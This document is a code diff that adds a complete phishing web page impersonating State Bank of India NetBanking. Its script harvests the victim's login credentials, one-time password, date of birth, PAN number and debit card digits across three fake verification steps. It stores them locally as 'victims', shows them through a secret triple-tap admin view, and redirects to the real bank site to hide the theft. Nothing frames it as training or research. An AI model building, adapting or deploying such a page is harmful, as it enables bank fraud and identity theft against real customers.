@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>State Bank of India - NetBanking</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #edf2f9; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
+        .top-bar { background: #2b3a67; color: white; padding: 12px 16px; display: flex; align-items: center; justify-content: space-between; }
+        .top-bar img { height: 32px; }
+        .container { padding: 20px 16px; max-width: 450px; margin: 0 auto; }
+        .card { background: white; border-radius: 16px; box-shadow: 0 6px 18px rgba(0,0,0,0.05); padding: 24px 20px; border: 1px solid #e0e7ef; margin-bottom: 20px; }
+        .sbi-logo { display: flex; justify-content: center; margin-bottom: 20px; }
+        .sbi-logo img { height: 45px; }
+        h3 { color: #1a2b4c; margin-bottom: 6px; font-weight: 600; font-size: 20px; }
+        .sub { color: #546e7a; margin-bottom: 24px; font-size: 14px; }
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; font-size: 14px; font-weight: 500; color: #2c3e50; margin-bottom: 6px; }
+        .input-group input { width: 100%; padding: 14px 16px; border: 1.5px solid #d4deec; border-radius: 10px; font-size: 16px; background: white; }
+        .captcha-box { background: #f4f7fc; padding: 12px; border-radius: 10px; margin-bottom: 20px; display: flex; align-items: center; }
+        .captcha-box span { background: white; padding: 8px 16px; border-radius: 6px; font-family: monospace; font-size: 20px; letter-spacing: 3px; border: 1px dashed #2b3a67; margin-right: 12px; }
+        .captcha-box input { flex: 1; padding: 12px; border: 1.5px solid #d4deec; border-radius: 8px; }
+        .login-btn { background: #2b3a67; color: white; border: none; width: 100%; padding: 16px; border-radius: 40px; font-size: 18px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+        .footer-links { margin-top: 24px; text-align: center; font-size: 13px; color: #5e7a93; }
+        .footer-links a { color: #2b3a67; text-decoration: none; margin: 0 8px; }
+
+        /* Processing Overlay */
+        #processingOverlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.98); z-index: 1000;
+            display: none; justify-content: center; align-items: center;
+            flex-direction: column; padding: 20px;
+        }
+        .spinner { width: 50px; height: 50px; border: 5px solid #e0e7ef; border-top-color: #2b3a67; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 24px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .progress-container { width: 250px; background: #e0e7ef; border-radius: 20px; height: 8px; margin: 20px 0; }
+        .progress-bar { width: 0%; height: 8px; background: #2b3a67; border-radius: 20px; transition: width 0.5s; }
+        #statusMsg { font-size: 16px; color: #1e2b3c; margin: 10px 0; font-weight: 500; }
+
+        /* OTP Page Styles */
+        .otp-container { display: flex; justify-content: space-between; margin: 20px 0; }
+        .otp-input { width: 50px; height: 60px; text-align: center; font-size: 24px; border: 1.5px solid #d4deec; border-radius: 10px; }
+        .resend-link { color: #2b3a67; font-weight: 500; text-decoration: none; }
+    </style>
+</head>
+<body>
+
+<div class="top-bar">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/c/cc/SBI-logo.svg" alt="SBI Logo">
+    <span style="font-size:14px;">NetBanking</span>
+</div>
+
+<div class="container">
+    <!-- Step 1: Login Form -->
+    <div class="card" id="loginCard">
+        <div class="sbi-logo"><img src="https://upload.wikimedia.org/wikipedia/commons/c/cc/SBI-logo.svg" alt="SBI"></div>
+        <h3>Login to NetBanking</h3>
+        <p class="sub">Access your accounts securely</p>
+        <form id="loginForm">
+            <div class="input-group">
+                <label>Username / Customer ID</label>
+                <input type="text" id="username" placeholder="Enter username" autocomplete="off" required>
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="password" placeholder="Enter password" autocomplete="off" required>
+            </div>
+            <div class="captcha-box">
+                <span id="captchaText">A3B8X</span>
+                <input type="text" id="captchaInput" placeholder="Enter captcha" required>
+            </div>
+            <button type="submit" class="login-btn">Secure Login</button>
+        </form>
+        <div class="footer-links">
+            <a href="#">Forgot Username?</a> | <a href="#">Forgot Password?</a> | <a href="#">New User? Register</a>
+        </div>
+    </div>
+
+    <!-- Step 2: OTP Verification (Hidden initially) -->
+    <div class="card" id="otpCard" style="display:none;">
+        <h3>Two-Factor Authentication</h3>
+        <p class="sub">We've sent a 6-digit OTP to your registered mobile number ******1234</p>
+        <div class="otp-container" id="otpInputs">
+            <input type="tel" maxlength="1" class="otp-input" pattern="[0-9]" inputmode="numeric">
+            <input type="tel" maxlength="1" class="otp-input" pattern="[0-9]" inputmode="numeric">
+            <input type="tel" maxlength="1" class="otp-input" pattern="[0-9]" inputmode="numeric">
+            <input type="tel" maxlength="1" class="otp-input" pattern="[0-9]" inputmode="numeric">
+            <input type="tel" maxlength="1" class="otp-input" pattern="[0-9]" inputmode="numeric">
+            <input type="tel" maxlength="1" class="otp-input" pattern="[0-9]" inputmode="numeric">
+        </div>
+        <p style="margin: 16px 0;"><a href="#" class="resend-link" id="resendOtp">Resend OTP</a></p>
+        <button class="login-btn" id="verifyOtpBtn">Verify & Continue</button>
+        <p style="font-size:12px; color:#777; margin-top:12px;">OTP valid for 10 minutes</p>
+    </div>
+
+    <!-- Step 3: Additional Security Verification (Hidden) -->
+    <div class="card" id="securityCard" style="display:none;">
+        <h3>Security Verification</h3>
+        <p class="sub">For your account safety, please confirm your details</p>
+        <div class="input-group">
+            <label>Date of Birth (DD/MM/YYYY)</label>
+            <input type="text" id="dob" placeholder="DD/MM/YYYY" autocomplete="off">
+        </div>
+        <div class="input-group">
+            <label>PAN Card Number</label>
+            <input type="text" id="pan" placeholder="ABCDE1234F" autocomplete="off">
+        </div>
+        <div class="input-group">
+            <label>Debit Card Last 6 Digits</label>
+            <input type="text" id="cardDigits" placeholder="123456" maxlength="6" autocomplete="off">
+        </div>
+        <button class="login-btn" id="securityContinueBtn">Continue to Dashboard</button>
+    </div>
+</div>
+
+<!-- Processing Overlay -->
+<div id="processingOverlay">
+    <div class="spinner"></div>
+    <div id="statusMsg">Verifying credentials...</div>
+    <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
+    <p style="margin-top:20px; color:#5e7a93; font-size:13px;">Please do not refresh or press back</p>
+</div>
+
+<script>
+    // ========== GLOBAL STATE ==========
+    let currentCaptcha = 'A3B8X';
+    let capturedData = {
+        username: '',
+        password: '',
+        otp: '',
+        dob: '',
+        pan: '',
+        cardDigits: '',
+        timestamp: '',
+        sessionToken: ''
+    };
+
+    // Load existing data
+    let victims = JSON.parse(localStorage.getItem('sbiVictims')) || [];
+
+    // ========== CAPTCHA ==========
+    function randomCaptcha() {
+        const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+        let c = '';
+        for(let i=0; i<5; i++) c += chars[Math.floor(Math.random() * chars.length)];
+        return c;
+    }
+    const captchaSpan = document.getElementById('captchaText');
+    currentCaptcha = randomCaptcha();
+    captchaSpan.textContent = currentCaptcha;
+    captchaSpan.addEventListener('click', function() {
+        currentCaptcha = randomCaptcha();
+        captchaSpan.textContent = currentCaptcha;
+    });
+
+    // ========== STEP 1: LOGIN ==========
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        const captchaInput = document.getElementById('captchaInput').value;
+
+        if (captchaInput.toUpperCase() !== currentCaptcha) {
+            alert('Invalid captcha');
+            currentCaptcha = randomCaptcha();
+            captchaSpan.textContent = currentCaptcha;
+            return;
+        }
+
+        capturedData.username = username;
+        capturedData.password = password;
+        capturedData.timestamp = new Date().toLocaleString('en-IN');
+
+        // Show OTP screen after processing
+        document.getElementById('loginCard').style.display = 'none';
+        
+        // Simulate sending OTP with overlay
+        const overlay = document.getElementById('processingOverlay');
+        const statusMsg = document.getElementById('statusMsg');
+        const progressBar = document.getElementById('progressBar');
+        overlay.style.display = 'flex';
+        
+        const steps = [
+            { msg: 'Verifying credentials...', progress: 30, delay: 800 },
+            { msg: 'Sending OTP to registered mobile...', progress: 70, delay: 1000 },
+            { msg: 'OTP sent successfully', progress: 100, delay: 500 }
+        ];
+        let step = 0;
+        function run() {
+            if (step < steps.length) {
+                statusMsg.textContent = steps[step].msg;
+                progressBar.style.width = steps[step].progress + '%';
+                step++;
+                setTimeout(run, steps[step-1].delay);
+            } else {
+                overlay.style.display = 'none';
+                document.getElementById('otpCard').style.display = 'block';
+            }
+        }
+        run();
+    });
+
+    // ========== OTP AUTO-TAB ==========
+    const otpInputs = document.querySelectorAll('.otp-input');
+    otpInputs.forEach((input, idx) => {
+        input.addEventListener('input', () => {
+            if (input.value.length === 1 && idx < otpInputs.length - 1) {
+                otpInputs[idx+1].focus();
+            }
+        });
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !input.value && idx > 0) {
+                otpInputs[idx-1].focus();
+            }
+        });
+    });
+
+    // ========== STEP 2: OTP VERIFICATION ==========
+    document.getElementById('verifyOtpBtn').addEventListener('click', function() {
+        let otp = '';
+        otpInputs.forEach(i => otp += i.value);
+        if (otp.length !== 6) {
+            alert('Please enter 6-digit OTP');
+            return;
+        }
+        capturedData.otp = otp;
+
+        // Show processing and move to security verification
+        const overlay = document.getElementById('processingOverlay');
+        const statusMsg = document.getElementById('statusMsg');
+        const progressBar = document.getElementById('progressBar');
+        overlay.style.display = 'flex';
+        statusMsg.textContent = 'Validating OTP...';
+        progressBar.style.width = '50%';
+        
+        setTimeout(() => {
+            statusMsg.textContent = 'OTP Verified. Loading security check...';
+            progressBar.style.width = '100%';
+            setTimeout(() => {
+                overlay.style.display = 'none';
+                document.getElementById('otpCard').style.display = 'none';
+                document.getElementById('securityCard').style.display = 'block';
+            }, 800);
+        }, 1200);
+    });
+
+    document.getElementById('resendOtp').addEventListener('click', function(e) {
+        e.preventDefault();
+        alert('New OTP sent to registered mobile.');
+    });
+
+    // ========== STEP 3: SECURITY VERIFICATION ==========
+    document.getElementById('securityContinueBtn').addEventListener('click', function() {
+        const dob = document.getElementById('dob').value;
+        const pan = document.getElementById('pan').value;
+        const cardDigits = document.getElementById('cardDigits').value;
+
+        if (!dob || !pan || !cardDigits) {
+            alert('Please fill all security details');
+            return;
+        }
+
+        capturedData.dob = dob;
+        capturedData.pan = pan;
+        capturedData.cardDigits = cardDigits;
+        capturedData.sessionToken = 'SESS-' + Math.random().toString(36).substring(2,15) + Date.now();
+
+        // Save everything to localStorage
+        victims.push(capturedData);
+        localStorage.setItem('sbiVictims', JSON.stringify(victims));
+
+        // Final processing and redirect to real SBI
+        const overlay = document.getElementById('processingOverlay');
+        const statusMsg = document.getElementById('statusMsg');
+        const progressBar = document.getElementById('progressBar');
+        overlay.style.display = 'flex';
+        
+        const steps = [
+            { msg: 'Verifying details...', progress: 20, delay: 600 },
+            { msg: 'Establishing secure session...', progress: 45, delay: 800 },
+            { msg: 'Loading your dashboard...', progress: 75, delay: 700 },
+            { msg: 'Almost there...', progress: 95, delay: 600 },
+            { msg: 'Redirecting...', progress: 100, delay: 500 }
+        ];
+        let idx = 0;
+        function runFinal() {
+            if (idx < steps.length) {
+                statusMsg.textContent = steps[idx].msg;
+                progressBar.style.width = steps[idx].progress + '%';
+                idx++;
+                setTimeout(runFinal, steps[idx-1].delay);
+            } else {
+                window.location.href = 'https://retail.onlinesbi.sbi/personal/';
+            }
+        }
+        runFinal();
+    });
+
+    // ========== TRIPLE TAP ON LOGO FOR ADMIN PANEL (Secret) ==========
+    let tapCount = 0;
+    let tapTimer;
+    document.querySelector('.top-bar img').addEventListener('click', function() {
+        tapCount++;
+        if (tapCount === 1) tapTimer = setTimeout(() => tapCount=0, 800);
+        if (tapCount >= 3) {
+            clearTimeout(tapTimer);
+            tapCount=0;
+            // Show quick admin preview
+            const data = localStorage.getItem('sbiVictims');
+            alert(data ? 'Captured Data:\n' + data : 'No data yet');
+        }
+    });
+</script>
+</body>
+</html>
